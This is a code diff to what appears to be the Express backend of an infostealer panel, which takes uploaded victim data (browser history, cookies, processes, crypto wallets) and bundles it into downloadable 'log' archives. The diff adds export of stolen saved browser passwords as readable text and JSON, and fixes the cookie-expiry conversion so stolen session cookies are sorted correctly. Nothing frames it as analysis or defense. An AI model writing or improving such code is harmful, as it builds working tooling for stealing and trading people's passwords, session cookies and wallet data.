@@ -375,12 +375,19 @@ app.post('/api/upload', (req, res) => {
             totalHistoryEntries += pcData.browserHistory.braveHistory?.length || 0;
         }
 
+        const passwordCount = pcData?.savedPasswords?.length || 0;
+        
         const dataSummary = {
             historyEntries: totalHistoryEntries,
             processes: pcData?.runningProcesses?.length || 0,
             installedApps: pcData?.installedApps?.length || 0,
-            cookies: transformedBrowserCookies.length || 0
+            cookies: transformedBrowserCookies.length || 0,
+            passwords: passwordCount
         };
+        
+        if (passwordCount > 0) {
+            console.log(`Password processing - savedPasswords: ${passwordCount} passwords received`);
+        }
 
         // Handle browserCookies - always include if present, even if empty (so merge knows to update)
         const pcDataToStore = { ...pcData };
@@ -652,7 +659,7 @@ app.get('/api/download/:logId', (req, res) => {
                 return true; // Session cookie or no expiration - consider it valid
             }
             
-            // expires_utc is in microseconds since Windows epoch (1601-01-01)
+            // expires_utc is in Windows FILETIME format (100-nanosecond intervals since Windows epoch 1601-01-01)
             const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
             
             // If expires is 0, it's a session cookie (never expires)
@@ -661,8 +668,8 @@ app.get('/api/download/:logId', (req, res) => {
             }
             
             try {
-                // Convert microseconds to milliseconds, then subtract epoch difference
-                const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+                // Convert 100-nanosecond intervals to milliseconds, then subtract epoch difference
+                const expiresMs = (cookie.expires / 10000) - WINDOWS_EPOCH_DIFF_MS;
                 const expiresDate = new Date(expiresMs);
                 
                 // Validate the date is reasonable
@@ -764,6 +771,20 @@ app.get('/api/download/:logId', (req, res) => {
             // Crypto wallets
             if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
                 archive.append(JSON.stringify(pcData.cryptoWallets, null, 2), { name: 'crypto_wallets.json' });
+            }
+
+            // Saved passwords
+            if (pcData.savedPasswords && Array.isArray(pcData.savedPasswords) && pcData.savedPasswords.length > 0) {
+                // Create a formatted text file for easy reading
+                const passwordsText = pcData.savedPasswords.map(pwd => 
+                    `Origin: ${pwd.origin || 'N/A'}\n` +
+                    `Username: ${pwd.username || 'N/A'}\n` +
+                    `Password: ${pwd.password || 'N/A'}\n` +
+                    `---`
+                ).join('\n');
+                archive.append(passwordsText, { name: 'saved_passwords.txt' });
+                // Also save as JSON for programmatic access
+                archive.append(JSON.stringify(pcData.savedPasswords, null, 2), { name: 'saved_passwords.json' });
             }
 
             // PC Information summary
